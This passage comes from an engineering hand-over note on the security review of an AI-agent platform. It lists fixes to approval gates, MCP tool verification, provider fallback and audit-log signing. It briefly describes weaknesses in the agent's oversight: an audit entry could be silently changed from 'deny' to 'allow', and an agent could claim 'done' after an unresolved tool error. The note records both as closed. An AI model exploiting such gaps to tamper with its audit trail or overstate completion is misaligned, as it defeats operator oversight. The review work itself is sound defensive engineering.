unit/integration-level with mocks, or against the real (but
non-LLM-calling) acpx binary for `--version`/`--help`. FX-A bullet 6
("prove end to end that representative filesystem, shell, browser,
X11, AT-SPI, vision, audio, Discord upload, memory, self_create_tool,
and code_evolve requests produce the expected registry, policy, and
audit events") is still fully open, and it's the prerequisite for
re-running most of the 89-case validation backlog with real evidence
rather than code-level reasoning about what *should* happen.

## First Next Step

If a way to safely exercise a real or scripted acpx delegate call
becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
everything else. Otherwise, **§2 and §3 of the security review are now
both fully closed**, with zero open sub-findings in either (SR-2.1:
scheduled jobs default to `capability_mode="safe-chat"`; SR-2.2: a real
`ApprovalGate` is wired into `ProactiveManager` and the Web API server;
SR-3.4's cross-session-aggregation sub-finding is fixed — `CostTracker`
is now per-session-keyed), and **§4 is now fully closed with all eight
items fixed**: SR-4.4 —
`_tool_loop()` rejects a "done" claim made immediately after an
unresolved tool error, up to 2 retries; SR-4.5 — `self_create_tool` no
longer claims written scripts are "created"/"registered" as usable
tools (operator-confirmed: kept proposal-only — the one item this
session where the operator chose the *smaller*, document-only path);
SR-4.3 — `AgentRuntime.resume_checkpoint()`/`missy recover --resume ID`
now actually continue an interrupted task from saved conversation
state; SR-4.2 — `SubAgentRunner`/`delegate_task` wired into production
with real concurrency, shared-runtime budget aggregation, and a
`MAX_SUB_AGENT_DEPTH` recursion bound; SR-4.7 — MCP tools are now
runtime-callable via `McpToolWrapper`, with `McpManager.call_tool()`
re-verifying the pinned digest and enforcing annotation-driven approval
before every call; SR-4.1 — `_record_learnings()` now actually persists
extracted learnings (was silently discarding them after extraction),
and `SleeptimeWorker` is wired into production exactly as its own
module docstring documented (operator-confirmed: enabled by default,
matching its own class default, unlike SR-4.5's opt-out choice); SR-4.6
— `OtelExporter.subscribe()`'s always-`TypeError`'ing call to
`event_bus.subscribe()` (silently caught) meant OTLP export received
zero events in every configuration ever, regardless of collector
reachability — fixed by wrapping `event_bus.publish` directly (mirroring
`AuditLogger`'s already-established pattern), plus redaction before
export and failure-count surfacing; SR-4.8 — `AgentRuntime._call_provider_with_fallback()`
now wraps every provider call with per-provider `CircuitBreaker`
cooldown tracking, one automatic key-rotation retry on auth failures,
and budget-gated cross-provider fallback with a full redacted audit
trail, closing the gap between `ProviderRegistry.rotate_key()`/
`_get_provider()`'s previously static, start-of-run-only check and the
mid-run recovery CLAUDE.md always implied existed; SR-1.1 —
`AuditLogger._handle_event()` (the one place every event reaches disk)
now signs the complete canonical record as a top-level
`identity_signature` field instead of the old 3-field signature
embedded inside mutable `detail`, with a real `verify_audit_log()` and
new `missy audit verify` CLI command closing the "nothing ever
verifies it" gap the review demonstrated with a live PoC (edit a
`deny` to `allow`, read it back clean) that this checkpoint reproduced
and then closed.
**SR-1.9b (DNS TOCTOU) is now the only open item in the security
review's numbered SR-x.y list** (plus the "harden secondary
availability hazards" bullet) — the natural next continuation now
that §1 (except this one item), §2, §3, and §4 are all fully closed.
Given how the last several checkpoints
went (SR-3.3 and SR-3.5 were both flagged "likely already fixed" and
both turned out to hide live, confirmed, previously-undetected bugs;
SR-2.1, SR-2.2, the SR-3.4 residual, and most SR-4.x fixes this session
turned out to have a second layer beyond the obvious fix — SR-2.1's
fail-closed legacy-record handling, SR-2.2's entirely-unwired
`ApprovalGate` requiring new REST endpoints, the SR-3.4 residual's
25-test mechanical-vs-intentional update split, SR-4.4's
fingerprint-history design discarded after live testing, SR-4.5/SR-4.2/
SR-4.7/SR-4.1(part 2) all turning out to be genuine product-policy
forks requiring explicit operator input rather than obvious "just fix
it" bugs (four separate times this session, each with a materially
different answer — SR-4.5 chose the conservative/smaller path, the
other three chose to build the real feature), SR-4.7's fix surfacing 2
pre-existing tests accidentally exercising a non-default `McpManager`
code path purely because manual `__new__()` construction never set an
attribute the real `__init__` would have, SR-4.1's sub-finding 1 being
a completely uneventful one-line mechanical fix sitting right next to
sub-finding 2's genuine design question in the same review item, SR-4.6
being the session's cleanest counter-example — a purely mechanical fix
with zero product-policy ambiguity, yet still hiding a *second*
pre-existing bug (`init_otel()`'s disabled-stub `AttributeError` crash,
with 2 tests that had literally encoded that crash as correct behavior)
found only by tracing the fix through to its test coverage), keep
applying the same discipline to whatever's picked up next: read the
actual current code, trace actual runtime call paths, specifically
check whether any existing test exercises the *real* production
dispatch/entry point rather than just the unit under test in isolation,
live-reproduce before declaring anything fixed, broken, or
not-applicable, verify test-suite health empirically before finalizing
any change that adds new background threads/processes/connections (as
done for SR-4.1's `SleeptimeWorker` thread-per-instance change), and
ask before implementing whenever a finding turns out to be a genuine
product-policy fork rather than a mechanical bug — but don't assume the
answer will always be "build the real feature": SR-4.5 is the
counter-example, and the deciding factor each time was whether the
fix would expand the set of code genuinely executable through the
agent, not merely whether the review offered a "document the
limitation" escape hatch. Alternatively pick up one of the concrete
scoped tasks above (#11, #12, #15, #16, #17), all self-contained and
not requiring a live delegate. A Web TUI browser page for the new
`/api/v1/approvals` endpoints is also a reasonable, self-contained
follow-up (the REST layer is done and tested; only the browser UI is
missing).
